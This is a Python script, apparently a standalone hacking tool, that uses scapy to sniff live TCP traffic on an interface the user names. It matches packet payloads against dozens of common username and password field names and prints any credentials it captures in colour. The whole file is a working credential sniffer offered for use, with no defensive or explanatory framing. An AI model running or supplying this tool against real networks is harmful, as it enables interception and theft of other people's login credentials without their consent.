from urllib import parse
from scapy.all import sniff, re, Raw
from scapy.layers.inet import TCP, IP
from termcolor import cprint, colored
import scapy.error


# extracts the login and passwords
def get_login_pass(body):
    user = None
    passwd = None
    # list of userfield names and password field
    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password', 'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    for login in userfields:
        # checks for login field name
        login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
        if login_re:
            # the results from the search
            user = login_re.group()
    # checks for password field name
    for passfield in passfields:
        pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            # the results from the search
            passwd = pass_re.group()

    if user or passwd:  # if there is a username or password
        return user, passwd


# filters the packets that may contain the username and passwords
def pkt_parser(packet):
    try:  # check if the packet has a tcp, raw  and IP-layer.
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):

            # the information in that tcp packet payload
            body = str(packet[TCP].payload)

            # holds the username and password
            user_pass = get_login_pass(body)

            # if any credentials are retrieved
            if user_pass[0] is not None or user_pass[1] is not None:
                # print the packet

                print('\n', body)
                if user_pass[0] is not None:
                    # print username
                    cprint(parse.unquote(user_pass[0]), 'green')
                else:
                    cprint('Username: Unknown', 'grey')

                if user_pass[1] is not None:
                    # prints password
                    cprint(parse.unquote(user_pass[1]), 'green')
                else:
                    cprint('Password: Unknown', 'grey')
        else:
            pass
    except TypeError:
        pass


if __name__ == "__main__":

    ir = True
    while ir:
        interface = input("Enter Interface i.e en0 or ethernet: ")  # make its user input
        try:
            # iface is the interface where the packet will be scanned
            # prn is function that's applied to each packets
            # store determines if the packets are stored or not, it is set to zero meaning dont save
            print()
            sniff(iface=interface, prn=pkt_parser, store=0)

        except KeyboardInterrupt:
            ir = False
            break
        except scapy.error.Scapy_Exception as e:
            if 'root' in str(e):
                print(colored("WARNING ", "red", attrs=['bold']) + colored('Not running application as Sudo!!', 'red'))
            elif 'BIOCSETIF' in str(e):
                print(colored('Not a valid interface', 'red'))
                print('\n')
            else:
                print('Something when wrong')
                if 'y' in input('Would you like to try again? y/n').lower():
                    pass
                else:
                    ir = False
